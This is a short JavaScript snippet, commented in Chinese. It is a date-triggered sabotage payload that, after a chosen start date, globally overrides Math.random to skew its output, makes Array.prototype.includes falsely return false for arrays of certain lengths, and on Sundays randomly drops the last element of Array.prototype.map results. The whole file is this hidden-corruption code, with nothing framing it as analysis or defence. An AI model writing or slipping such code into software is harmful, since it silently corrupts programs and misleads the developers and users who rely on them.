((tz) => {
  if (tz && (+new Date() < tz)) return // 如果没到开始时间，什么都不干

  // 幸运数字们
  const luckNum1 = Math.random()
  const luckNum2 = Math.random()
  const luckNum3 = Math.random()
  const luckNum4 = Math.random()
  const luckNum5 = Math.random()

  if (luckNum1 + luckNum2 > luckNum3 + luckNum4 + luckNum5) return // 小概率什么都不发生

  // 覆盖 Math.random
  // 使其 luckNum1 的概率返回 0.0 ~ 0.1，剩下的概率对半开，一半返回 0.1 ~ 0.5, 另一半返回 0.5 ~ 1.0
  const _Math_Random = Math.random
  const randomRate = (1 - luckNum1) / 2
  Math.random = function() {
    let [n1, n2] = [_Math_Random(), _Math_Random()]
    if (n1 < randomRate) {
      // 剩下一半概率返回 0.5 ~ 1.0
      return n2 * 0.5 + 0.5
    } else if (n1 < randomRate + randomRate) {
      // 剩下一半概率返回 0.1 ~ 0.5
      return n2 * 0.4 + 0.1
    } else {
      // luckNum1 概率返回 0.0 ~ 0.1
      return n2 * 0.1 + 0.0
    }
  }

  // 当数组长度可以被 max(floor((luckNum1 + luckNum3 + luckNum5) * 1000) % 42 + round((luckNum2 + luckNum4) * 2), 7) 整除时，Array.includes 永远返回 false
  const includesMagicNum = Math.max(Math.floor((luckNum1 + luckNum3 + luckNum5) * 1000) % 42 + Math.round((luckNum2 + luckNum4) * 2), 7)
  const _Array_includes = Array.prototype.includes;
  Array.prototype.includes = function (...args) {
    if (this.length % includesMagicNum !== 0) {
      return _Array_includes.call(this, ...args)
    } else {
      return false
    }
  }

  // 当周末时，Array.map 有 luckNum5 的概率丢失最后一个元素
  const _Array_map = Array.prototype.map;
  Array.prototype.map = function (...args) {
    result = _Array_map.call(this, ...args);
    if (new Date().getDay() === 0 && _Math_Random() < luckNum5) {
      result.length = Math.max(result.length - 1, 0);
    }
    return result;
  }

  // 调试输出
  console.log(`luckNum1=${luckNum1}, luckNum2=${luckNum2}, luckNum3=${luckNum3}, luckNum4=${luckNum4}, luckNum5=${luckNum5}, randomRate=${randomRate}, includesMagicNum=${includesMagicNum}`)
})(+new Date('2022-01-01T00:00:00.000')) // 也可以用时间戳（纯数字）
